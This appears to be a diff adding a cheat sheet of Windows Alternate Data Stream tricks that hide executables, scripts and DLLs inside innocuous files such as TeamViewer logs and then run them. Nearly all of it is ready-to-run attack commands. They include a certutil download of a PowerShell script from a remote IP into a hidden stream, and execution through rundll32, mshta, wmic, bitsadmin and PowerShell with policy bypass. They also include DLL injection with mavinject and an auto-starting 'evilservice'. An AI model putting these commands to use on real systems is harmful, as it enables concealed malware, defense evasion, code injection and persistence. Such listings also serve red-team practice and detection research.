@@ -1,0 +1,91 @@
+####################################################
+#Add content and execute Alternate Data Stream (ADS)
+####################################################
+
+###################
+#Add content to ADS
+###################
+echo "blahblah" > c:\temp\file.txt
+type c:\windows\system32\cmd.exe > c:\ADS\file.txt:cmd.exe
+
+type C:\temp\blah.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:blah.exe"
+
+type "C:\Program Files\test\wscripthello.vbs" > "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:wscripts.vbs"
+
+extrac32 C:\temp\procexp.cab c:\temp\file.txt:procexp.exe
+
+findstr /V /L Youhou c:\temp\procexp.exe > c:\temp\file.txt:procexp.exe
+
+certutil.exe -urlcache -split -f https://192.168.69.69/blah.ps1 c:\temp:ttt
+
+esentutl.exe /y C:\temp\autoruns.exe /d c:\temp\file.txt:autoruns.exe /o
+
+makecab c:\temp\autoruns.exe c:\temp\cabtest.txt:autoruns.cab
+
+print /D:c:\temp\file.txt:autoruns.exe c:\temp\Autoruns.exe
+
+reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\temp\file.txt:evilreg.reg
+
+regedit /E c:\temp\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
+
+expand \\webdav\folder\file.bat c:\temp\file.txt:file.bat
+
+powershell -command " & {(Get-Content C:\temp\file.exe -Raw | Set-Content C:\temp\file.txt -Stream file.exe)}"
+
+curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
+
+
+##########################
+#Executing the ADS content
+##########################
+* WMIC
+wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:blah.exe"'
+
+* Rundll32
+rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
+rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll
+rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll
+
+* Cscript
+cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"
+
+* Wscript
+wscript c:\temp\file.txt:script.vbs
+
+* MSHTA
+mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
+
+* Powershell.exe
+powershell -ep bypass - < c:\temp:ttt
+
+* Powershell.exe
+powershell -command " & {(Get-Content C:\temp\1.txt -Stream file.exe -Raw | Set-Content c:\temp\file.exe) | start-process c:\temp\file.exe}"
+
+* Forfiles
+forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"
+
+* Mavinject.exe
+c:\windows\SysWOW64\notepad.exe
+tasklist | findstr notepad
+notepad.exe                   2648 Console                    1    13 200 Ko
+type c:\temp\AtomicTest.dll > "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
+c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 2648 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
+
+* Control.exe (will load an unsigned, ADS reflective DLL to bypass)
+control.exe c:\windows\tasks\blah:notepad_reflective_x64.dll
+
+* Create service and run
+sc create evilservice binPath= "\"c:\temp\file.txt:cmd.exe\" /c echo works > \"c:\temp\works.txt\"" DisplayName= "evilservice" start= auto
+sc start evilservice
+
+* Regedit.exe
+regedit c:\temp\file.txt:regfile.reg
+
+* Bitsadmin.exe
+bitsadmin /create myfile
+bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
+bitsadmin /SetNotifyCmdLine myfile c:\temp\1.txt:cmd.exe NULL
+bitsadmin /RESUME myfile
+
+* AppVLP.exe
+AppVLP.exe c:\windows\tracing\test.txt:ha.exe
